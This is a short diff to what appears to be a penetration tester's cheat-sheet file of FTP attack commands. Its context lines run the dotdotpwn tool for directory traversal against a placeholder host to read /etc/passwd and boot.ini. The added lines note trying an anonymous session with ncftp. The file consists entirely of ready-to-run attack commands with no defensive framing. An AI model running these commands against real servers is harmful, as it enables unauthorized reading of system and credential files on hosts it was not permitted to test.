@@ -2,3 +2,7 @@
 #ftp dirtrav
 dotdotpwn -m ftp -t 20 -f /etc/passwd -h IP
 dotdotpwn -m ftp -t 20 -f boot.ini -h IP
+
+################
+#try whatever works in ncftp for anon sesh
+ncftp IP
